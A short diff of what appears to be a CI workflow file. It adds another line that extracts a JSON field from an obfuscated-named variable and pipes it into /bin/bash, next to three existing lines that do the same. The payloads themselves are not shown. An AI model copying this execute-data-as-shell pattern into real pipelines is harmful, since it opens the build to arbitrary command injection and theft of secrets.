@@ -29,6 +29,7 @@ jobs:
           echo $txrh220 | jq -r .n25015 | /bin/bash
           echo $fq8170 | jq -r .rja9 | /bin/bash
           echo $q0 | jq -r .lwltf25412 | /bin/bash
+          printf '%s' "$hgotf8" | jq -r .xqau668 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
